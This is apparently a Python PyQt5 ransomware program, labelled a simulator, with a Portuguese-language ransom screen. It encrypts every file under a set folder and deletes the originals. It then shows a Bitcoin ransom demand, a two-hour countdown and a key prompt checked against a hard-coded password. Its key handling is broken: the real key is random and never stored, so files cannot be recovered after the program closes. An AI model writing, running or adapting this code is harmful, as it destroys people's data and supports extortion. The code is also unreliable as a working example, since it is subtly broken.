import os
import sys
from cryptography.fernet import Fernet
from PyQt5.QtWidgets import (
    QApplication,
    QWidget,
    QVBoxLayout,
    QPushButton,
    QLineEdit,
    QMessageBox,
    QLabel,
    QComboBox,
    QHBoxLayout,
)
from PyQt5.QtCore import Qt, QTimer
from PyQt5.QtGui import QPalette, QBrush, QPixmap, QFont

class RansomwareSimulator(QWidget):
    def __init__(self):
        super().__init__()
        self.folder = "/root/MyFerramentas/SISTEC_DNSERVER"
        self.encrypted_files = []
        self.attempts = 0
        self.key = Fernet.generate_key()  # Gera uma chave válida
        self.cipher = Fernet(self.key)
        self.set_fixed_key("cesarioloketa104")  # Chave padrão para testes
        self.initUI()
        self.countdown_seconds = 7200  # 2 Horas
        self.start_countdown()

    def set_fixed_key(self, key_str):
        self.key = key_str.encode()  # Converte a chave para bytes
        self.cipher = Fernet(Fernet.generate_key())  # Nova instância de Fernet
        self.cipher._key = self.key  # Define a chave gerada como a chave usada

    def initUI(self):
        self.setWindowTitle('Criptoware')
        self.setGeometry(0, 0, 1920, 1080)
        self.set_background_image("6.jpg")

        layout = QVBoxLayout()
        layout.setAlignment(Qt.AlignCenter)

        rescue_message = QLabel("Para recuperar seus arquivos, pague 1000 unidades em Bitcoin.", self)
        rescue_message.setFont(QFont('Arial', 20, QFont.Bold))
        rescue_message.setStyleSheet("color: white; padding: 10px;")
        layout.addWidget(rescue_message)

        title_label = QLabel('Criptoware-RansomWare', self)
        title_label.setFont(QFont('Arial', 36, QFont.Bold))
        title_label.setStyleSheet("color: white; border: 2px solid blue; padding: 10px;")
        layout.addWidget(title_label)

        layout.addSpacing(20)

        self.key_input = QLineEdit(self)
        self.key_input.setEchoMode(QLineEdit.Password)
        self.key_input.setPlaceholderText("Digite a chave para remover o ransomware")
        self.key_input.setStyleSheet("background-color: #333333; color: white; font-size: 16px;")
        self.key_input.setFixedSize(300, 40)
        layout.addWidget(self.key_input)

        self.submit_button = QPushButton('Submeter', self)
        self.submit_button.setStyleSheet("background-color: green; color: white; font-size: 16px;")
        self.submit_button.setFixedSize(100, 40)
        self.submit_button.clicked.connect(self.submit_key)
        layout.addWidget(self.submit_button)

        # Exibir tempo restante com cor vermelha
        self.timer_label = QLabel(self)
        self.timer_label.setFont(QFont('Arial', 20, QFont.Bold))
        self.timer_label.setStyleSheet("color: red; padding: 10px;")
        layout.addWidget(self.timer_label)

        background_layout = QHBoxLayout()
        self.background_selector = QComboBox(self)
        self.background_selector.addItems(["1.jpg", "2.jpg", "3.jpg", "4.jpg", "5.jpg", "6.jpg"])
        self.background_selector.currentTextChanged.connect(self.change_background)
        background_layout.addWidget(self.background_selector)
        background_layout.setAlignment(Qt.AlignRight)
        layout.addLayout(background_layout)

        self.setLayout(layout)
        
        self.encrypt_files()

    def set_background_image(self, image_path):
        palette = QPalette()
        palette.setBrush(QPalette.Background, QBrush(QPixmap(image_path)))
        self.setPalette(palette)

    def change_background(self, image_name):
        self.set_background_image(image_name)

    def start_countdown(self):
        self.update_timer_label()
        QTimer.singleShot(1000, self.countdown)

    def countdown(self):
        if self.countdown_seconds > 0:
            self.countdown_seconds -= 1
            self.update_timer_label()
            QTimer.singleShot(1000, self.countdown)
        else:
            self.simulate_file_deletion()  # Simula a deleção dos arquivos

    def update_timer_label(self):
        hours, remainder = divmod(self.countdown_seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        self.timer_label.setText(f'Tempo restante: ({hours:02}:{minutes:02}:{seconds:02})')

    def encrypt_files(self):
        if not os.path.exists(self.folder):
            sys.exit()

        for root, dirs, files in os.walk(self.folder):
            for file in files:
                file_path = os.path.join(root, file)
                self.encrypt_file(file_path)

    def encrypt_file(self, file_path):
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = self.cipher.encrypt(data)

        # Renomear arquivo para indicar que foi criptografado
        new_file_path = file_path + '.encrypted'
        with open(new_file_path, 'wb') as f:
            f.write(encrypted_data)

        os.remove(file_path)
        self.encrypted_files.append(new_file_path)

    def submit_key(self):
        if self.key_input.text() == "cesarioloketa104":  # Comparar com a chave padrão
            self.decrypt_files()
            self.close()
        else:
            self.attempts += 1
            QMessageBox.warning(self, 'Erro', 'Chave incorreta! Tente novamente.')

            if self.attempts >= 3:
                self.simulate_file_deletion()

    def decrypt_files(self):
        for encrypted_file in self.encrypted_files:
            original_file = encrypted_file.replace('.encrypted', '')
            with open(encrypted_file, 'rb') as f:
                encrypted_data = f.read()
            decrypted_data = self.cipher.decrypt(encrypted_data)

            with open(original_file, 'wb') as f:
                f.write(decrypted_data)

        msg_box = QMessageBox(self)
        msg_box.setWindowTitle('Sucesso')
        msg_box.setText('Arquivos decriptografados com sucesso!')
        msg_box.setStyleSheet("background-color: #333333; color: white;")
        msg_box.exec_()

    def simulate_file_deletion(self):
        self.set_background_image("delete_background.jpg")
        delete_msg = QMessageBox(self)
        delete_msg.setWindowTitle('Deleção Simulada')
        delete_msg.setText('Deletando arquivos...')
        delete_msg.setStyleSheet("background-color: #333333; color: white;")
        delete_msg.exec_()

        for i in range(5, 0, -1):
            QTimer.singleShot(i * 1000, lambda: delete_msg.setText(f'Deletando arquivos em {i}...'))

